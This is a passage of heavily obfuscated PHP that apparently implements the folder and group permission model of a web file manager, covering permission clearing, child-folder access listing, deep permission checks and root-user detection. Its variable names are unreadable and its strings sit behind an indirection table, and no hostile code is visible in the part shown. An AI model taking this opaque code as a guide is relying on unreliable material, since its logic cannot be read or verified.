$ı¿œšõ = array($¿èÆôü[1864] => $•ó‡ñ‡®); $ã„ÛôåÍ = Model($¿èÆôü[1954])->field($¿èÆôü[1666])->where($ı¿œšõ)->select(); $ã„ÛôåÍ = array_to_keyvalue($ã„ÛôåÍ, $¿èÆôü[12], $¿èÆôü[1666]); } $ˆ½ê§ğğ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $–¬Îïä‹ = array(); foreach ($Àöù­ñÓ as $¯íè³ûæ) { if (!in_array($¯íè³ûæ[$¿èÆôü[178]], $ˆ½ê§ğğ)) { show_json(LNG($¿èÆôü[2046]), !1); } if ($•ó‡ñ‡® != $îÙâ¸™) { if ($¯íè³ûæ[$¿èÆôü[178]] == SourceModel::TYPE_GROUP) { } if ($¯íè³ûæ[$¿èÆôü[548]] != 0 && !in_array($¯íè³ûæ[$¿èÆôü[548]], $ã„ÛôåÍ)) { } } if ($¯íè³ûæ[$¿èÆôü[548]] == 0) { $¯íè³ûæ[$¿èÆôü[178]] = SourceModel::TYPE_USER; } $–¬Îïä‹[] = array($¿èÆôü[181] => $ŠÉ§Ò², $¿èÆôü[178] => intval($¯íè³ûæ[$¿èÆôü[178]]), $¿èÆôü[548] => intval($¯íè³ûæ[$¿èÆôü[548]]), $¿èÆôü[1968] => intval($¯íè³ûæ[$¿èÆôü[1968]]) ? intval($¯íè³ûæ[$¿èÆôü[1968]]) : 0, $¿èÆôü[2028] => intval($¯íè³ûæ[$¿èÆôü[2028]]) ? intval($¯íè³ûæ[$¿èÆôü[2028]]) : -1); } $this->where(array($¿èÆôü[468] => $ŠÉ§Ò²))->delete(); $this->addAll($–¬Îïä‹); return !0; } public function authClear($‡ûèÜî) { $Ûšåæ°¸ =& $_SERVER[–Ú¬çÁ]; $®Â›ß¿® = Model($Ûšåæ°¸[1352])->sourceInfo($‡ûèÜî); $ßÖœ¶ê… = array($‡ûèÜî); if ($®Â›ß¿®[$Ûšåæ°¸[462]] == $Ûšåæ°¸[88]) { $Í“­Ùø¹ = array($Ûšåæ°¸[630] => array($Ûšåæ°¸[590], $®Â›ß¿®[$Ûšåæ°¸[563]] . $‡ûèÜî . $Ûšåæ°¸[591])); $ßÖœ¶ê… = Model($Ûšåæ°¸[1352])->field($Ûšåæ°¸[468])->where($Í“­Ùø¹)->getField($Ûšåæ°¸[181], !0); $ßÖœ¶ê…[] = $‡ûèÜî; } $this->where(array($Ûšåæ°¸[468] => array($Ûšåæ°¸[469], $ßÖœ¶ê…)))->delete(); return !0; } public function getAllChildren($şáŸçš) { $ùâ‡à× =& $_SERVER[–Ú¬çÁ]; $Òµâò…û = Model($ùâ‡à×[1352])->sourceInfo($şáŸçš); if ($Òµâò…û[$ùâ‡à×[462]] != $ùâ‡à×[88]) { return $this->sourceListAuth(array($şáŸçš)); } if ($Òµâò…û[$ùâ‡à×[178]] != SourceModel::TYPE_GROUP) { return array(); } $ˆü³˜íÅ = 1; $†€™«¾Õ = array($şáŸçš); if ($Òµâò…û[$ùâ‡à×[180]] == $ùâ‡à×[222] && $Òµâò…û[$ùâ‡à×[548]] != $ˆü³˜íÅ) { $†€™«¾Õ = $this->groupChidldAllRootSource($Òµâò…û[$ùâ‡à×[548]]); } $˜ª¿Œ› = $this->field($ùâ‡à×[181])->group($ùâ‡à×[181])->select(); $˜ª¿Œ› = array_to_keyvalue($˜ª¿Œ›, $ùâ‡à×[12], $ùâ‡à×[181]); if (!$˜ª¿Œ›) { return array(); } $Ñßïªï¿ = $ùâ‡à×[2047]; $î‹‡ûÆ· = array($ùâ‡à×[181] => array($ùâ‡à×[7], $˜ª¿Œ›), $ùâ‡à×[482] => $ùâ‡à×[222]); $êÎÚÙÑ› = Model($ùâ‡à×[845])->field($Ñßïªï¿)->where($î‹‡ûÆ·)->select(); $ÃåÖ½– = array($şáŸçš); foreach ($êÎÚÙÑ› as $¬ŞõƒéÃ) { foreach ($†€™«¾Õ as $âñæ˜Ã) { $ñÙÏ©Ûˆ = $ùâ‡à×[50] . $âñæ˜Ã . $ùâ‡à×[50]; $ˆàâÂÜö = $¬ŞõƒéÃ[$ùâ‡à×[563]] . $¬ŞõƒéÃ[$ùâ‡à×[181]] . $ùâ‡à×[50]; if (strstr($ˆàâÂÜö, $ñÙÏ©Ûˆ)) { $ÃåÖ½–[] = $¬ŞõƒéÃ[$ùâ‡à×[181]]; break; } } } return $this->sourceListAuth($ÃåÖ½–); } private function sourceListAuth($††©µÕ¤) { $á³Ğ¼Íü =& $_SERVER[–Ú¬çÁ]; $¤½÷ı×á = Model($á³Ğ¼Íü[1352])->sourceListInfo($††©µÕ¤, !0); $´¢Áö¥ğ = $this->sourceAuthSelect($††©µÕ¤); $¼òáÅÅÍ = array(); $¾îêÚ’Å = array(); foreach ($¤½÷ı×á as $³§ã¡Üİ) { unset($³§ã¡Üİ[$á³Ğ¼Íü[506]]); unset($³§ã¡Üİ[$á³Ğ¼Íü[504]]); unset($³§ã¡Üİ[$á³Ğ¼Íü[464]]); unset($³§ã¡Üİ[$á³Ğ¼Íü[87]]); $ç¹£‹­³ = $´¢Áö¥ğ[$³§ã¡Üİ[$á³Ğ¼Íü[181]]]; if (!$ç¹£‹­³) { continue; } $³§ã¡Üİ[$á³Ğ¼Íü[2048]] = $this->authTargetInfo($ç¹£‹­³); $³§ã¡Üİ[$á³Ğ¼Íü[561]] = rtrim($³§ã¡Üİ[$á³Ğ¼Íü[567]], $á³Ğ¼Íü[8]) . $á³Ğ¼Íü[8] . ltrim($³§ã¡Üİ[$á³Ğ¼Íü[561]], $á³Ğ¼Íü[8]); $¼òáÅÅÍ[] = $³§ã¡Üİ; $¤±ä•©— = count(explode($á³Ğ¼Íü[8], trim($³§ã¡Üİ[$á³Ğ¼Íü[561]], $á³Ğ¼Íü[8]))); $¾îêÚ’Å[] = $¤±ä•©— + ($³§ã¡Üİ[$á³Ğ¼Íü[33]] == $á³Ğ¼Íü[75] ? 0 : 1000); } array_multisort($¾îêÚ’Å, SORT_ASC, $¼òáÅÅÍ); return $¼òáÅÅÍ; } private function groupChidldAllRootSource($·ïàµçş) { $„†ÍôØ— =& $_SERVER[–Ú¬çÁ]; $Ë²ş’¬ = Model($„†ÍôØ—[2049])->groupChildrenAll($·ïàµçş); $¡Àè©‚­ = array($„†ÍôØ—[180] => 0, $„†ÍôØ—[548] => array($„†ÍôØ—[7], $Ë²ş’¬), $„†ÍôØ—[178] => SourceModel::TYPE_GROUP); $Ó¿ÅÛ‡¹ = Model($„†ÍôØ—[845])->field($„†ÍôØ—[181])->where($¡Àè©‚­)->select(); $Ó¿ÅÛ‡¹ = array_to_keyvalue($Ó¿ÅÛ‡¹, $„†ÍôØ—[12], $„†ÍôØ—[181]); return $Ó¿ÅÛ‡¹; } private function authTargetInfo($ÅÌ¤ÂŸ) { $èŞıà‰š =& $_SERVER[–Ú¬çÁ]; $™ŠÆ„± = array(); $™ì·§¸‘ = array(); $‡ÕÇº£Ì = 2 << 25; foreach ($ÅÌ¤ÂŸ as $çœÌ Ûƒ) { $Æ¸ÛğÖÖ = Model($èŞıà‰š[550])->listData($çœÌ Ûƒ[$èŞıà‰š[1968]]); if (!$Æ¸ÛğÖÖ) { continue; } if ($çœÌ Ûƒ[$èŞıà‰š[178]] == SourceModel::TYPE_USER) { $‚î°­¨× = Model($èŞıà‰š[556])->getInfoSimpleOuter($çœÌ Ûƒ[$èŞıà‰š[548]]); if ($‚î°­¨×[$èŞıà‰š[1666]] == $èŞıà‰š[1208]) { continue; } if ($‚î°­¨×[$èŞıà‰š[1666]] == $èŞıà‰š[222]) { $‚î°­¨×[$èŞıà‰š[32]] = LNG($èŞıà‰š[2050]); } } else { $‚î°­¨× = Model($èŞıà‰š[564])->getInfoSimple($çœÌ Ûƒ[$èŞıà‰š[548]]); } if (!$‚î°­¨×) { continue; } $‚î°­¨×[$èŞıà‰š[517]] = $Æ¸ÛğÖÖ; $™ŠÆ„±[] = $‚î°­¨×; $êçÓ¼°ª = 0; if ($çœÌ Ûƒ[$èŞıà‰š[178]] == SourceModel::TYPE_GROUP) { $êçÓ¼°ª = $‡ÕÇº£Ì * 2; } if ($çœÌ Ûƒ[$èŞıà‰š[178]] == SourceModel::TYPE_USER) { $êçÓ¼°ª = $‡ÕÇº£Ì; } if ($çœÌ Ûƒ[$èŞıà‰š[178]] == SourceModel::TYPE_USER && $çœÌ Ûƒ[$èŞıà‰š[548]] == $èŞıà‰š[222]) { $êçÓ¼°ª = 0; } $™ì·§¸‘[] = $Æ¸ÛğÖÖ[$èŞıà‰š[464]] + $êçÓ¼°ª; } array_multisort($™ì·§¸‘, SORT_DESC, $™ŠÆ„±); return $™ŠÆ„±; } public function getAllChildrenByUser($áÀ¸Âšƒ, $œë«) { $ßÖ¹ÉŞê =& $_SERVER[–Ú¬çÁ]; $¨êÒ¨ÂÚ = Model($ßÖ¹ÉŞê[577])->getInfo($œë«); if (!$œë« || !$áÀ¸Âšƒ || !$¨êÒ¨ÂÚ) { return array(); } $ô‘óÖŠà = Model($ßÖ¹ÉŞê[1352])->sourceInfo($áÀ¸Âšƒ); $Ÿç™…™¸ = array(); $Ò°’Æå = 1; if ($ô‘óÖŠà[$ßÖ¹ÉŞê[180]] == $ßÖ¹ÉŞê[222] && $ô‘óÖŠà[$ßÖ¹ÉŞê[548]] != $Ò°’Æå && $this->groupContainUser($ô‘óÖŠà[$ßÖ¹ÉŞê[548]], $œë«)) { foreach ($¨êÒ¨ÂÚ[$ßÖ¹ÉŞê[2051]] as $ÍÌÖ¡‚˜) { $¬û—ËóÙ = Model($ßÖ¹ÉŞê[564])->getInfo($ÍÌÖ¡‚˜[$ßÖ¹ÉŞê[1864]]); $Ú½óÓÛä = Model($ßÖ¹ÉŞê[577])->getInfoSimpleOuter($œë«); $Ú½óÓÛä[$ßÖ¹ÉŞê[517]] = $ÍÌÖ¡‚˜[$ßÖ¹ÉŞê[464]]; if (Model($ßÖ¹ÉŞê[550])->authCheckAction($ÍÌÖ¡‚˜[$ßÖ¹ÉŞê[464]][$ßÖ¹ÉŞê[464]], $ßÖ¹ÉŞê[1885])) { continue; } $Å—ºÆ¦é = array($ßÖ¹ÉŞê[32] => $ßÖ¹ÉŞê[1228] . $¬û—ËóÙ[$ßÖ¹ÉŞê[32]], $ßÖ¹ÉŞê[181] => $¬û—ËóÙ[$ßÖ¹ÉŞê[87]][$ßÖ¹ÉŞê[181]], $ßÖ¹ÉŞê[84] => KodIO::make($¬û—ËóÙ[$ßÖ¹ÉŞê[87]][$ßÖ¹ÉŞê[181]]), $ßÖ¹ÉŞê[180] => $ßÖ¹ÉŞê[222], $ßÖ¹ÉŞê[178] => $ßÖ¹ÉŞê[557], $ßÖ¹ÉŞê[33] => $ßÖ¹ÉŞê[594], $ßÖ¹ÉŞê[561] => $¬û—ËóÙ[$ßÖ¹ÉŞê[568]], $ßÖ¹ÉŞê[1864] => $¬û—ËóÙ[$ßÖ¹ÉŞê[1864]], $ßÖ¹ÉŞê[565] => $¬û—ËóÙ[$ßÖ¹ÉŞê[180]], $ßÖ¹ÉŞê[2048] => array($Ú½óÓÛä)); $Ÿç™…™¸[$Å—ºÆ¦é[$ßÖ¹ÉŞê[181]]] = $Å—ºÆ¦é; } } $áäôº…ù = array(); $¬İ¹Õˆœ = $this->getAllChildren($áÀ¸Âšƒ); foreach ($¬İ¹Õˆœ as $ÊÔÜÃŠ) { $øÜ·…Ô· = !1; foreach ($ÊÔÜÃŠ[$ßÖ¹ÉŞê[2048]] as $É‘¦±³‡) { if ($É‘¦±³‡[$ßÖ¹ÉŞê[1666]]) { if ($É‘¦±³‡[$ßÖ¹ÉŞê[1666]] == $œë«) { $øÜ·…Ô· = !0; break; } } if ($É‘¦±³‡[$ßÖ¹ÉŞê[1864]]) { if ($this->groupContainUser($É‘¦±³‡[$ßÖ¹ÉŞê[1864]], $œë«)) { $øÜ·…Ô· = !0; break; } } } if ($øÜ·…Ô·) { $áäôº…ù[] = $ÊÔÜÃŠ; } $Ó¬—‰ÜË = $ÊÔÜÃŠ[$ßÖ¹ÉŞê[181]]; if (isset($Ÿç™…™¸[$Ó¬—‰ÜË])) { $ÊÔÜÃŠ[$ßÖ¹ÉŞê[2048]][] = $Ÿç™…™¸[$Ó¬—‰ÜË][0]; $Ÿç™…™¸[$Ó¬—‰ÜË] = !1; } } $Ÿç™…™¸ = array_filter(array_values($Ÿç™…™¸)); $áäôº…ù = array_merge($Ÿç™…™¸, $áäôº…ù); return $áäôº…ù; } public function setAllChildrenByUser($ÈõÄÂËº, $²¹‚„Û•, $Éµ‘¿Ê) { $úÛÅêÒ¤ =& $_SERVER[–Ú¬çÁ]; $Òñ¸²°Œ = $this->getAllChildrenByUser($ÈõÄÂËº, $²¹‚„Û•); if (!$Éµ‘¿Ê || !$Òñ¸²°Œ) { return !1; } foreach ($Òñ¸²°Œ as $Ú´ŠœÀ”) { $×Âë¶© = array(); foreach ($Ú´ŠœÀ”[$úÛÅêÒ¤[2048]] as $ô”Œ…Æª) { $òÇ‘ÌÊ = $ô”Œ…Æª[$úÛÅêÒ¤[517]]; $Î¾Šµ¾ = $ô”Œ…Æª[$úÛÅêÒ¤[1666]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $“Î¼»í¶ = $ô”Œ…Æª[$úÛÅêÒ¤[1666]] ? $ô”Œ…Æª[$úÛÅêÒ¤[1666]] : $ô”Œ…Æª[$úÛÅêÒ¤[1864]]; if ($ô”Œ…Æª[$úÛÅêÒ¤[1666]] && $ô”Œ…Æª[$úÛÅêÒ¤[1666]] == $²¹‚„Û•) { continue; } $×Âë¶©[] = array($úÛÅêÒ¤[181] => $Ú´ŠœÀ”[$úÛÅêÒ¤[181]], $úÛÅêÒ¤[178] => $Î¾Šµ¾, $úÛÅêÒ¤[548] => intval($“Î¼»í¶), $úÛÅêÒ¤[1968] => isset($òÇ‘ÌÊ[$úÛÅêÒ¤[452]]) ? intval($òÇ‘ÌÊ[$úÛÅêÒ¤[452]]) : 0, $úÛÅêÒ¤[2028] => isset($òÇ‘ÌÊ[$úÛÅêÒ¤[2028]]) ? intval($òÇ‘ÌÊ[$úÛÅêÒ¤[2028]]) : -1); } $×Âë¶©[] = array($úÛÅêÒ¤[181] => $Ú´ŠœÀ”[$úÛÅêÒ¤[181]], $úÛÅêÒ¤[178] => SourceModel::TYPE_USER, $úÛÅêÒ¤[548] => intval($²¹‚„Û•), $úÛÅêÒ¤[1968] => intval($Éµ‘¿Ê), $úÛÅêÒ¤[2028] => -1); $this->where(array($úÛÅêÒ¤[468] => $Ú´ŠœÀ”[$úÛÅêÒ¤[181]]))->delete(); $this->addAll($×Âë¶©); } return !0; } public function get($‹¿İóÔÜ) { $²·•ƒ = $this->getSourceList(array($‹¿İóÔÜ), !0); return $²·•ƒ[0]; } public function getSourceList($·¿Ÿœöö, $³™®Óµ¸ = false, $÷¿ÎÈÕÈ = false) { $‹ÚÖŠÁ =& $_SERVER[–Ú¬çÁ]; if (!$·¿Ÿœöö) { return array(); } $ĞÏ‘¸’¬ = Model($‹ÚÖŠÁ[1352]); if (!$³™®Óµ¸ && count($·¿Ÿœöö) == 1) { $³™®Óµ¸ = array(); $³™®Óµ¸[$·¿Ÿœöö[0]] = $ĞÏ‘¸’¬->sourceInfo($·¿Ÿœöö[0]); } if (!$³™®Óµ¸) { $ÂŞÙ“ø– = array($‹ÚÖŠÁ[468] => array($‹ÚÖŠÁ[469], $·¿Ÿœöö)); $³™®Óµ¸ = $ĞÏ‘¸’¬->field($‹ÚÖŠÁ[2052])->where($ÂŞÙ“ø–)->select(); $³™®Óµ¸ = array_to_keyvalue($³™®Óµ¸, $‹ÚÖŠÁ[181]); } $ÕÖ‹ÀÁ = $·¿Ÿœöö; foreach ($³™®Óµ¸ as $šñôÆ«¿ => $Şİ‰á¬¢) { $ãö›íØ¹ = $ĞÏ‘¸’¬->parentLevelArray($Şİ‰á¬¢[$‹ÚÖŠÁ[563]]); $ÕÖ‹ÀÁ = array_merge($ÕÖ‹ÀÁ, array($šñôÆ«¿), array_reverse($ãö›íØ¹)); } $ÕÖ‹ÀÁ = array_values(array_unique($ÕÖ‹ÀÁ)); if (!$ÕÖ‹ÀÁ) { return array(); } $ÕşÆÍŠö = $this->sourceAuthSelect($ÕÖ‹ÀÁ); $ê–¤ğ = array(); foreach ($ÕÖ‹ÀÁ as $Á€éÇèé) { if (isset($ÕşÆÍŠö[$Á€éÇèé])) { $ê–¤ğ[$Á€éÇèé] = $ÕşÆÍŠö[$Á€éÇèé]; } } $Â‹Õ¹‰ = $this->userIsRoot($÷¿ÎÈÕÈ); $½ıÖ“Í = AuthModel::authAll(); $‰ÍñéÅŞ = array($‹ÚÖŠÁ[465] => $½ıÖ“Í, $‹ÚÖŠÁ[2053] => array($‹ÚÖŠÁ[470] => 0, $‹ÚÖŠÁ[1870] => $½ıÖ“Í, $‹ÚÖŠÁ[471] => LNG($‹ÚÖŠÁ[2054]), $‹ÚÖŠÁ[1887] => $‹ÚÖŠÁ[2055])); $ÖÊ±ğ¯• = array(); foreach ($³™®Óµ¸ as $Á€éÇèé => $í­îö„•) { if ($Â‹Õ¹‰ && $GLOBALS[$‹ÚÖŠÁ[6]][$‹ÚÖŠÁ[1883]]) { $ÖÊ±ğ¯•[$Á€éÇèé] = $‰ÍñéÅŞ; continue; } $ÖÊ±ğ¯•[$Á€éÇèé] = $this->makeSourceAuth($í­îö„•, $ê–¤ğ, $÷¿ÎÈÕÈ); } return $ÖÊ±ğ¯•; } public function authDeepCheck($ıíÌ¢§, $ŸİÑ€ˆÆ = false) { $÷ê‚ßœ =& $_SERVER[–Ú¬çÁ]; $ŸİÑ€ˆÆ = $ŸİÑ€ˆÆ ? $ŸİÑ€ˆÆ : USER_ID; $áˆ—ç¢÷ = $this->makeAuthDeep($ŸİÑ€ˆÆ); if (!in_array($ıíÌ¢§, $áˆ—ç¢÷[$÷ê‚ßœ[2056]])) { return !1; } $€•©æ‘Ò = array(); foreach ($áˆ—ç¢÷[$÷ê‚ßœ[2057]] as $÷­„€³ğ => $Õş“Ñı¼) { if (!in_array($ıíÌ¢§, $Õş“Ñı¼)) { continue; } $€•©æ‘Ò[] = $÷­„€³ğ; } if (!$€•©æ‘Ò) { return !1; } $Œ¦Œßƒ = $€•©æ‘Ò ? $€•©æ‘Ò[0] : $ıíÌ¢§; return array($÷ê‚ßœ[465] => -1, $÷ê‚ßœ[517] => array($÷ê‚ßœ[470] => $÷ê‚ßœ[1208], $÷ê‚ßœ[1870] => $÷ê‚ßœ[222], $÷ê‚ßœ[471] => LNG($÷ê‚ßœ[2058]), $÷ê‚ßœ[1887] => $÷ê‚ßœ[2059]), $÷ê‚ßœ[2060] => LNG($÷ê‚ßœ[2061]), $÷ê‚ßœ[2062] => $this->sourceAuthInfo($Œ¦Œßƒ)); } protected function makeAuthDeep($şğ¡±¶Ì = false) { $—ûı¤ˆú =& $_SERVER[–Ú¬çÁ]; static $õÖÍÃ»Ã = array(); $şğ¡±¶Ì = $şğ¡±¶Ì ? $şğ¡±¶Ì : USER_ID; if (isset($õÖÍÃ»Ã[$şğ¡±¶Ì])) { return $õÖÍÃ»Ã[$şğ¡±¶Ì]; } $¦Ğî›Ä» = Model($—ûı¤ˆú[2063])->listData(); $ğÙãÒßé = array(); foreach ($¦Ğî›Ä» as $ÁÂäøÖ) { if ($ÁÂäøÖ[$—ûı¤ˆú[464]] == 0 && $ÁÂäøÖ[$—ûı¤ˆú[1886]] == $—ûı¤ˆú[88]) { $ğÙãÒßé[] = $ÁÂäøÖ[$—ûı¤ˆú[452]]; } } $‚Ê‚—áò = $this->userGroupParents($şğ¡±¶Ì); $Õ¹•êµ° = array($—ûı¤ˆú[178] => SourceModel::TYPE_USER, $—ûı¤ˆú[548] => $şğ¡±¶Ì); if ($‚Ê‚—áò) { $Õ¹•êµ° = array(array($—ûı¤ˆú[178] => SourceModel::TYPE_USER, $—ûı¤ˆú[548] => $şğ¡±¶Ì), array($—ûı¤ˆú[178] => SourceModel::TYPE_GROUP, $—ûı¤ˆú[548] => array($—ûı¤ˆú[469], $‚Ê‚—áò)), $—ûı¤ˆú[1020] => $—ûı¤ˆú[1962]); } $Ìµí« = $this->field($—ûı¤ˆú[2064])->where($Õ¹•êµ°)->select(); $ĞÊ‚ÅÔÉ = array(); $ƒÉ´üŒ  = array_to_keyvalue_group($Ìµí«, $—ûı¤ˆú[181]); foreach ($ƒÉ´üŒ  as $É¡åğù° => $èÍ ªÍ¾) { $¯ß–¬Ç§ = $this->authArrayCheck($èÍ ªÍ¾, $şğ¡±¶Ì); if ($¯ß–¬Ç§[$—ûı¤ˆú[465]] > 0) { $ĞÊ‚ÅÔÉ[] = $É¡åğù° . $—ûı¤ˆú[12]; } } if ($‚Ê‚—áò) { $ü•‰†Ëô = Model($—ûı¤ˆú[564]); foreach ($‚Ê‚—áò as $šÅÊîÄ÷) { $¿…‡©Ÿ­ = $ü•‰†Ëô->getInfo($šÅÊîÄ÷); if (!$¿…‡©Ÿ­ || !is_array($¿…‡©Ÿ­[$—ûı¤ˆú[87]])) { continue; } $ĞÊ‚ÅÔÉ[] = $¿…‡©Ÿ­[$—ûı¤ˆú[87]][$—ûı¤ˆú[181]]; } } $üŒ¦‚§ = array(); $ÍÃÁÆ¯Ş = $‚Ê‚—áò; $šá‚ĞŸÚ = Model($—ûı¤ˆú[1352]); $ü•‰†Ëô = Model($—ûı¤ˆú[564]); $ãï†Óö = array(); $Î½Ş€¯ = array(); $¢ §’Á = array(); $Ëè´ƒ·Ú = array(); if ($ĞÊ‚ÅÔÉ) { $‰æı¦Íƒ = $šá‚ĞŸÚ->where(array($—ûı¤ˆú[181] => array($—ûı¤ˆú[469], $ĞÊ‚ÅÔÉ)))->select(); foreach ($‰æı¦Íƒ as $Äàœ¿Ÿ¯) { $¢ªëô½Î = $šá‚ĞŸÚ->parentLevelArray($Äàœ¿Ÿ¯[$—ûı¤ˆú[563]]); $üŒ¦‚§ = array_merge($üŒ¦‚§, $¢ªëô½Î); $ÍÃÁÆ¯Ş[] = $Äàœ¿Ÿ¯[$—ûı¤ˆú[548]]; $ãï†Óö[$Äàœ¿Ÿ¯[$—ûı¤ˆú[181]]] = $¢ªëô½Î; $Î½Ş€¯[$Äàœ¿Ÿ¯[$—ûı¤ˆú[181]]] = $Äàœ¿Ÿ¯[$—ûı¤ˆú[548]]; } } $ÍÃÁÆ¯Ş = array_values(array_unique($ÍÃÁÆ¯Ş)); $Š°¼á¼‰ = $ÍÃÁÆ¯Ş; foreach ($Š°¼á¼‰ as $šÅÊîÄ÷) { $¿…‡©Ÿ­ = $ü•‰†Ëô->getInfo($šÅÊîÄ÷); $¢ªëô½Î = $šá‚ĞŸÚ->parentLevelArray($¿…‡©Ÿ­[$—ûı¤ˆú[563]]); $ÍÃÁÆ¯Ş = array_merge($ÍÃÁÆ¯Ş, $¢ªëô½Î); } $ÍÃÁÆ¯Ş = array_values(array_unique($ÍÃÁÆ¯Ş)); foreach ($ÍÃÁÆ¯Ş as $šÅÊîÄ÷) { $¿…‡©Ÿ­ = $ü•‰†Ëô->getInfo($šÅÊîÄ÷); $üŒ¦‚§[] = $¿…‡©Ÿ­[$—ûı¤ˆú[87]][$—ûı¤ˆú[181]]; $¢ §’Á[$šÅÊîÄ÷] = $¿…‡©Ÿ­[$—ûı¤ˆú[87]][$—ûı¤ˆú[181]]; $Ëè´ƒ·Ú[$šÅÊîÄ÷] = $šá‚ĞŸÚ->parentLevelArray($¿…‡©Ÿ­[$—ûı¤ˆú[563]]); } foreach ($ãï†Óö as $©„Õ„æ· => $Œßó”») { $ÊÁÔÉâ´ = $Î½Ş€¯[$©„Õ„æ·]; if (!$ÊÁÔÉâ´ || !$¢ §’Á[$ÊÁÔÉâ´]) { continue; } $ïÄÁş‹ = array(); foreach ($Ëè´ƒ·Ú[$ÊÁÔÉâ´] as $šÅÊîÄ÷) { $ïÄÁş‹[] = $¢ §’Á[$šÅÊîÄ÷]; } $ãï†Óö[$©„Õ„æ·] = array_merge($ïÄÁş‹, $Œßó”»); } $üŒ¦‚§ = array_values(array_unique($üŒ¦‚§)); $ö…ÈŠ§â = array($—ûı¤ˆú[2056] => $üŒ¦‚§, $—ûı¤ˆú[2057] => $ãï†Óö); $õÖÍÃ»Ã[$şğ¡±¶Ì] = $ö…ÈŠ§â; return $ö…ÈŠ§â; } private function makeSourceAuth($¼éß¬¯Ï, $€¡€û¦, $íÕ›˜í = false) { $—Á¨ˆÅÌ =& $_SERVER[–Ú¬çÁ]; $¶ÓÈ›ÂÌ = $—Á¨ˆÅÌ[88]; $‹¤²ËÎï = $¼éß¬¯Ï[$—Á¨ˆÅÌ[548]]; $ÊÅ²®»‘ = $¼éß¬¯Ï[$—Á¨ˆÅÌ[178]] == SourceModel::TYPE_GROUP; $’¶«·µ = $ÊÅ²®»‘ ? $this->groupRootAuth($‹¤²ËÎï, $íÕ›˜í) : !1; if ($’¶«·µ && Model($—Á¨ˆÅÌ[550])->authCheckAction($’¶«·µ[$—Á¨ˆÅÌ[464]], $—Á¨ˆÅÌ[1885])) { return $this->groupAuthInfo($’¶«·µ, $‹¤²ËÎï); } $°§„·®· = Model($—Á¨ˆÅÌ[1352])->parentLevelArray($¼éß¬¯Ï[$—Á¨ˆÅÌ[563]]); $°§„·®· = array_merge(array($¼éß¬¯Ï[$—Á¨ˆÅÌ[181]]), array_reverse($°§„·®·)); $öÔ¬¬Üú = !1; foreach ($°§„·®· as $Õéãã˜Ú) { if (!isset($€¡€û¦[$Õéãã˜Ú])) { continue; } $ÇÄ½’÷€ = $this->authMake($€¡€û¦[$Õéãã˜Ú], $íÕ›˜í); if ($ÇÄ½’÷€[$—Á¨ˆÅÌ[517]]) { $öÔ¬¬Üú = $ÇÄ½’÷€; break; } } if (!$ÊÅ²®»‘) { return $öÔ¬¬Üú; } if (!$öÔ¬¬Üú && $’¶«·µ) { $öÔ¬¬Üú = $this->groupAuthInfo($’¶«·µ, $‹¤²ËÎï); } if (!$öÔ¬¬Üú) { $å¤Í€½ = Model($—Á¨ˆÅÌ[564])->getInfo($‹¤²ËÎï); $ã“˜«Èß = explode($—Á¨ˆÅÌ[50], trim($å¤Í€½[$—Á¨ˆÅÌ[563]], $—Á¨ˆÅÌ[50])); $ã“˜«Èß = array_reverse($ã“˜«Èß); foreach ($ã“˜«Èß as $ñøğÑÙØ) { if ($ñøğÑÙØ == $—Á¨ˆÅÌ[222] || $ñøğÑÙØ == $¶ÓÈ›ÂÌ) { continue; } $éÕ´À°¿ = $this->groupRootAuth($ñøğÑÙØ, $íÕ›˜í); if (!$éÕ´À°¿) { continue; } $öÔ¬¬Üú = $this->groupAuthInfo($éÕ´À°¿, $ñøğÑÙØ); break; } } if (!$öÔ¬¬Üú || $öÔ¬¬Üú[$—Á¨ˆÅÌ[465]] <= 0) { $ÍØ•ª¾¼ = $this->authDeepCheck($¼éß¬¯Ï[$—Á¨ˆÅÌ[181]], $íÕ›˜í); if ($ÍØ•ª¾¼) { $öÔ¬¬Üú = $ÍØ•ª¾¼; } } return $öÔ¬¬Üú; } private function userIsRoot($Ã¡½¿å = false) { $§ıòÕ’ì =& $_SERVER[–Ú¬çÁ]; if (!$Ã¡½¿å && _get($GLOBALS, $§ıòÕ’ì[546])) { return !0; } $»Ò¿¿ = Model($§ıòÕ’ì[577])->getInfo($Ã¡½¿å); $Ï•‘óçÄ = Model($§ıòÕ’ì[2065])->listData($»Ò¿¿[$§ıòÕ’ì[1539]]); if ($Ï•‘óçÄ && $Ï•‘óçÄ[$§ıòÕ’ì[554]][$§ıòÕ’ì[2066]] == 1) { return !0; } return !1; } private function sourceAuthInfo($¦•¸Ç×¹) { $õ°½Î” =& $_SERVER[–Ú¬çÁ]; $ßóØ’Š¨ = Model($õ°½Î”[1352]); $ß×Ç’ã® = $ßóØ’Š¨->sourceInfo($¦•¸Ç×¹); if (!$ß×Ç’ã®) { return !1; } $ßóØ’Š¨->groupPathDisplay($ß×Ç’ã®); $³Šµ›º = array($ß×Ç’ã®); $³Šµ›º = $ßóØ’Š¨->_listAppendPath($³Šµ›º); $ß×Ç’ã® = $³Šµ›º[0]; $ˆ‚«– = $ß×Ç’ã®[$õ°½Î”[561]]; if (isset($ß×Ç’ã®[$õ°½Î”[569]])) { $µŞ•Ó¯ = explode($õ°½Î”[8], trim($ß×Ç’ã®[$õ°½Î”[561]], $õ°½Î”[8])); array_shift($µŞ•Ó¯); $ˆ‚«– = $ß×Ç’ã®[$õ°½Î”[567]] . $õ°½Î”[2067] . implode($õ°½Î”[8], $µŞ•Ó¯); } return array($õ°½Î”[471] => $ß×Ç’ã®[$õ°½Î”[32]], $õ°½Î”[84] => KodIO::make($ß×Ç’ã®[$õ°½Î”[181]]), $õ°½Î”[2068] => $ˆ‚«–); } private function groupAuthInfo($†ëÎÍüë, $Š¡£şÅÖ) { $¦©—Óóš =& $_SERVER[–Ú¬çÁ]; $éşÃü£İ = Model($¦©—Óóš[564])->getInfo($Š¡£şÅÖ); return array($¦©—Óóš[2069] => intval($†ëÎÍüë[$¦©—Óóš[464]]), $¦©—Óóš[2053] => $†ëÎÍüë, $¦©—Óóš[2070] => LNG($¦©—Óóš[2071]), $¦©—Óóš[2062] => array($¦©—Óóš[471] => $éşÃü£İ[$¦©—Óóš[32]], $¦©—Óóš[84] => KodIO::make($éşÃü£İ[$¦©—Óóš[87]][$¦©—Óóš[181]]), $¦©—Óóš[2068] => $éşÃü£İ[$¦©—Óóš[568]])); } protected function groupRootAuth($Öæå¾Ü°, $Ü‹º©Ğ¬ = false) { $Ê‚âš¶ş =& $_SERVER[–Ú¬çÁ]; $Ü‹º©Ğ¬ = 